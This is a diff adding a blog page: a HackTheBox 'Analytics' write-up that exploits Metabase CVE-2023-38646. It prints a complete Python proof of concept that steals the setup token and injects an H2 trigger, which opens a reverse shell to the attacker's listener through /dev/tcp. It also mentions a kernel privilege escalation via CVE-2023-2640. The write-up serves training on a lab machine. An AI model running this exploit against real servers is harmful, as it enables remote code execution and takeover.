@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html class="direction--ltr"lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Analytics d20834dbe29d4fc69b3712e6d0384a6c | Pwn3d777</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Analytics d20834dbe29d4fc69b3712e6d0384a6c" />
+<meta name="author" content="GitHub User" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Analytics" />
+<meta property="og:description" content="Analytics" />
+<link rel="canonical" href="https://your-site-url/writeups/2025/07/10/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c.html" />
+<meta property="og:url" content="https://your-site-url/writeups/2025/07/10/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c.html" />
+<meta property="og:site_name" content="Pwn3d777" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-07-10T16:05:57+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Analytics d20834dbe29d4fc69b3712e6d0384a6c" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"GitHub User"},"dateModified":"2025-07-10T16:05:57+00:00","datePublished":"2025-07-10T16:05:57+00:00","description":"Analytics","headline":"Analytics d20834dbe29d4fc69b3712e6d0384a6c","mainEntityOfPage":{"@type":"WebPage","@id":"https://your-site-url/writeups/2025/07/10/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c.html"},"url":"https://your-site-url/writeups/2025/07/10/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" />
+  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="https://your-site-url/feed.xml" title="Pwn3d777" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
+  <script src="/assets/js/jquery.magnific-popup.js"></script>
+</head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">Pwn3d777<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        
+        
+        <a class="color-cyan-hover" href="https://twitter.com/bitbrain_"><i class="fab fa-twitter-square"></i></a>
+        
+        
+        
+        <a class="color-red-hover" href="https://bitbrain.itch.io"><i class="fab fa-itch-io"></i></a>
+        
+        
+        
+        <a class="color-purple-hover" href="https://github.com/bitbrain"><i class="fab fa-github-square"></i></a>
+        
+        
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+
+<div class="description">This is my blog, here you will find more information about me, in addition to my work on HackTheBox and some interesting apps i've developed
+</div>
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">Analytics d20834dbe29d4fc69b3712e6d0384a6c</h1>
+  
+  <div class="post-date">
+    Published on 10 Jul 2025
+    
+  </div>
+  
+  <h1 id="analytics">Analytics</h1>
+
+<p>HackTheBox: Medium</p>
+
+<aside>
+💡 Analytics is a linux machine where we can exploit some vulnerabilities(**RCE vulnerability**), and learn the importance of save sensitive information.
+
+</aside>
+
+<h2 id="1-enumeration">1: Enumeration</h2>
+
+<ul>
+  <li>nmap scanning</li>
+</ul>
+
+<p><img src="/assets/images/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c_Untitled.png" alt="Untitled" /></p>
+
+<p>Let’s look around http service</p>
+
+<p><img src="/assets/images/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c_Untitled_1.png" alt="Untitled" /></p>
+
+<p>A login interface change to this subdomain</p>
+
+<p>Metabase has a vulnerability (CVE-2023-38646)</p>
+
+<p><img src="/assets/images/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c_Untitled_2.png" alt="Untitled" /></p>
+
+<h2 id="2-user-flag">2: User flag</h2>
+
+<p>Use this POC</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import requests
+import argparse
+import <span class="nb">base64
+</span>import json
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+from urllib.parse import urlparse
+
+requests.packages.urllib3.disable_warnings<span class="o">(</span>InsecureRequestWarning<span class="o">)</span>
+
+def get_setup_token_and_version<span class="o">(</span>ip_address<span class="o">)</span>:
+    endpoint <span class="o">=</span> <span class="s2">"/api/session/properties"</span>
+    url <span class="o">=</span> f<span class="s2">"{ip_address}{endpoint}"</span>
+    try:
+        print<span class="o">(</span>f<span class="s2">"[DEBUG] Fetching setup token from {url}..."</span><span class="o">)</span>
+        response <span class="o">=</span> requests.get<span class="o">(</span>url, <span class="nv">verify</span><span class="o">=</span>False<span class="o">)</span>
+        <span class="k">if </span>response.status_code <span class="o">==</span> 200:
+            data <span class="o">=</span> response.json<span class="o">()</span>
+            setup_token <span class="o">=</span> data.get<span class="o">(</span><span class="s2">"setup-token"</span><span class="o">)</span>
+            metabase_version <span class="o">=</span> data.get<span class="o">(</span><span class="s2">"version"</span>, <span class="o">{})</span>.get<span class="o">(</span><span class="s2">"tag"</span><span class="o">)</span>
+
+            <span class="k">if </span>setup_token is None:
+                print<span class="o">(</span>f<span class="s2">"[DEBUG] Setup token not found or is null for IP: {ip_address}</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>
+            <span class="k">else</span>:
+                print<span class="o">(</span>f<span class="s2">"[DEBUG] Setup Token: {setup_token}"</span><span class="o">)</span>
+                print<span class="o">(</span>f<span class="s2">"[DEBUG] Version: {metabase_version}"</span><span class="o">)</span>
+
+            <span class="k">return </span>setup_token
+    except requests.exceptions.RequestException as e:
+        print<span class="o">(</span>f<span class="s2">"[DEBUG] Exception occurred: {e}"</span><span class="o">)</span>
+        print<span class="o">(</span>f<span class="s2">"[DEBUG] Failed to connect to {ip_address}.</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>
+
+def post_setup_validate<span class="o">(</span>ip_address, setup_token, listener_ip, listener_port<span class="o">)</span>:
+    payload <span class="o">=</span> base64.b64encode<span class="o">(</span>f<span class="s2">"bash -c 'bash -i &gt;&amp;/dev/tcp/{listener_ip}/{listener_port} 0&gt;&amp;1'"</span>.encode<span class="o">())</span>.decode<span class="o">()</span>
+
+    print<span class="o">(</span>f<span class="s2">"[DEBUG] Payload = {payload}"</span><span class="o">)</span>
+
+    endpoint <span class="o">=</span> <span class="s2">"/api/setup/validate"</span>
+    url <span class="o">=</span> f<span class="s2">"{ip_address}{endpoint}"</span>
+    headers <span class="o">=</span> <span class="o">{</span><span class="s1">'Content-Type'</span>: <span class="s1">'application/json'</span><span class="o">}</span>
+    data <span class="o">=</span> <span class="o">{</span>
+        <span class="s2">"token"</span>: setup_token,
+        <span class="s2">"details"</span>: <span class="o">{</span>
+            <span class="s2">"is_on_demand"</span>: False,
+            <span class="s2">"is_full_sync"</span>: False,
+            <span class="s2">"is_sample"</span>: False,
+            <span class="s2">"cache_ttl"</span>: None,
+            <span class="s2">"refingerprint"</span>: False,
+            <span class="s2">"auto_run_queries"</span>: True,
+            <span class="s2">"schedules"</span>: <span class="o">{}</span>,
+            <span class="s2">"details"</span>: <span class="o">{</span>
+                <span class="s2">"db"</span>: f<span class="s2">"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1</span><span class="se">\\</span><span class="s2">;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS </span><span class="nv">$$</span><span class="s2">//javascript</span><span class="se">\n</span><span class="s2">java.lang.Runtime.getRuntime().exec('bash -c }||')</span><span class="se">\n</span><span class="nv">$$</span><span class="s2">--=x"</span>,
+                <span class="s2">"advanced-options"</span>: False,
+                <span class="s2">"ssl"</span>: True
+            <span class="o">}</span>,
+            <span class="s2">"name"</span>: <span class="s2">"test"</span>,
+            <span class="s2">"engine"</span>: <span class="s2">"h2"</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    print<span class="o">(</span>f<span class="s2">"[DEBUG] Sending request to {url} with headers {headers} and data {json.dumps(data, indent=4)}"</span><span class="o">)</span>
+
+    try:
+        response <span class="o">=</span> requests.post<span class="o">(</span>url, <span class="nv">headers</span><span class="o">=</span>headers, <span class="nv">json</span><span class="o">=</span>data, <span class="nv">verify</span><span class="o">=</span>False<span class="o">)</span>
+        print<span class="o">(</span>f<span class="s2">"[DEBUG] Response received: {response.text}"</span><span class="o">)</span>
+        <span class="k">if </span>response.status_code <span class="o">==</span> 200:
+            print<span class="o">(</span>f<span class="s2">"[DEBUG] POST to {url} successful.</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>
+        <span class="k">else</span>:
+            print<span class="o">(</span>f<span class="s2">"[DEBUG] POST to {url} failed with status code: {response.status_code}</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>
+    except requests.exceptions.RequestException as e:
+        print<span class="o">(</span>f<span class="s2">"[DEBUG] Exception occurred: {e}"</span><span class="o">)</span>
+        print<span class="o">(</span>f<span class="s2">"[DEBUG] Failed to connect to {url}</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>
+
+def preprocess_url<span class="o">(</span>user_input<span class="o">)</span>:
+    parsed_url <span class="o">=</span> urlparse<span class="o">(</span>user_input<span class="o">)</span>
+    protocol <span class="o">=</span> f<span class="s2">"{parsed_url.scheme}://"</span> <span class="k">if </span>parsed_url.scheme <span class="k">else</span> <span class="s2">"http://"</span>
+    netloc <span class="o">=</span> parsed_url.netloc or parsed_url.path
+    <span class="k">return </span>protocol + netloc.rstrip<span class="o">(</span><span class="s1">'/'</span><span class="o">)</span>
+
+<span class="k">if </span>__name__ <span class="o">==</span> <span class="s2">"__main__"</span>:
+    parser <span class="o">=</span> argparse.ArgumentParser<span class="o">(</span><span class="nv">description</span><span class="o">=</span><span class="s1">'Check setup token'</span><span class="o">)</span>
+    parser.add_argument<span class="o">(</span><span class="s1">'--rhost'</span>, <span class="nb">type</span><span class="o">=</span>str, <span class="nb">help</span><span class="o">=</span><span class="s1">'Metabase server IP address (including http:// or https:// and port number if needed)'</span><span class="o">)</span>
+    parser.add_argument<span class="o">(</span><span class="s1">'--lhost'</span>, <span class="nb">type</span><span class="o">=</span>str, <span class="nb">help</span><span class="o">=</span><span class="s1">'Listener IP address'</span><span class="o">)</span>
+    parser.add_argument<span class="o">(</span><span class="s1">'--lport'</span>, <span class="nb">type</span><span class="o">=</span>int, <span class="nv">default</span><span class="o">=</span>4444, <span class="nb">help</span><span class="o">=</span><span class="s1">'Listener port (default is 4444)'</span><span class="o">)</span>
+    args <span class="o">=</span> parser.parse_args<span class="o">()</span>
+
+    print<span class="o">(</span>f<span class="s2">"[DEBUG] Original rhost: {args.rhost}"</span><span class="o">)</span>
+    args.rhost <span class="o">=</span> preprocess_url<span class="o">(</span>args.rhost<span class="o">)</span>
+    print<span class="o">(</span>f<span class="s2">"[DEBUG] Preprocessed rhost: {args.rhost}"</span><span class="o">)</span>
+
+    print<span class="o">(</span>f<span class="s2">"[DEBUG] Input Arguments - rhost: {args.rhost}, lhost: {args.lhost}, lport: {args.lport}"</span><span class="o">)</span>
+
+    setup_token <span class="o">=</span> get_setup_token_and_version<span class="o">(</span>args.rhost<span class="o">)</span>
+    print<span class="o">(</span>f<span class="s2">"[DEBUG] Setup token: {setup_token}"</span><span class="o">)</span>
+    <span class="k">if </span>setup_token:
+        post_setup_validate<span class="o">(</span>args.rhost, setup_token, args.lhost, args.lport<span class="o">)</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c_Untitled_3.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c_Untitled_4.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c_Untitled_5.png" alt="Untitled" /></p>
+
+<h2 id="3-priv-esc">3: Priv esc</h2>
+
+<p><img src="/assets/images/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c_Untitled_6.png" alt="Untitled" /></p>
+
+<p>We see a kernel with an outdated version (CVE-2023-2640)</p>
+
+<p>Just give it executable premises after downloaded it on tmp</p>
+
+<p>We’ve got root flag</p>
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'https://your-site-url/writeups/2025/07/10/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c.html';
+     this.page.identifier = '/writeups/2025/07/10/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c';
+     this.page.title = 'Analytics d20834dbe29d4fc69b3712e6d0384a6c';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//<your-disqus-shortname>.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e.html">
+            Dog 207b952552918059ae99cbb25a8392ef
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9.html">
+            Titanic 1eab9525529180a9b52fc9a7eb126a50
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb.html">
+            Cat 1abb9525529180ae82d4f25f2121346a
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+
+
+<script>
+  let i = 0;
+  const text = '';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+
+  // Image modal
+  var $imgs = [];
+  $('img').each(function(idx) {
+    var obj = {
+      src: $(this).attr('src')
+    }
+    $imgs.push(obj);
+    var elem = $(this);
+    $(this).click(function() {
+      $('.modal').magnificPopup('open', idx);
+    });
+  });
+
+  $('.modal').magnificPopup({
+    items: $imgs,
+    type: 'image',
+    closeOnContentClick: true,
+    mainClass: 'mfp-img-mobile',
+    image: {
+      verticalFit: true
+    }
+    
+  });
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
